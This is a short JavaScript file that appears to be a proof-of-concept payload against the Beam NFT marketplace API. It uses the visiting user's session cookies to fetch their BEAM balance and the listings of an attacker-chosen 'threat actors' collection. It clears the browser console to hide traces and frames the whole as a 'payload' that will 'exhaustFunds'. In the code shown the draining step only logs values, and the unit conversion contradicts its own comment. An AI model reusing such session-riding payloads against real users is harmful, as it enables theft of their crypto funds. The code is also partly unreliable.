getData = async () => {
  // urls
  cid = "89389edd "; // Beam Apes CID (replace with threat actors collection ID)

  // fetch balance data
  const balance = await fetch("https://api.beamnft.art/user/get", {
    method: "GET",
    headers: {
      "Access-Control-Request-Headers": "*",
    },
    credentials: "include",
  });

  // fetch nfts from exploiters collection
  const nfts = await fetch(`https://api.beamnft.art/collection/get/${cid}`, {
    method: "GET",
    headers: {
      "Access-Control-Request-Headers": "*",
    },
    credentials: "include",
  });

  const balanceData = await balance.json();
  const nftData = await nfts.json();

  return [balanceData, nftData];
};

exhaustFunds = (balance, nfts) => {
  // balance in BEAM and GROTH
  let beamBalance = balance;
  let grothBalance = balance / 100000000;

  console.clear(); // sanitize console

  console.log(`balance in BEAM: ${beamBalance}`);
  console.log(`balance in GROTH: ${grothBalance}`);

  // console.log(walletBalance);
  console.log(nfts);
};

payload = async () => {
  let [balanceData, nftData] = await getData();
  let balance = balanceData.result.user.balances.BEAM.BEAM.a; // users balance (in GROTH)
  let nfts = nftData.result.nfts; // object containing nft data

  exhaustFunds(balance, nfts);
};

payload();
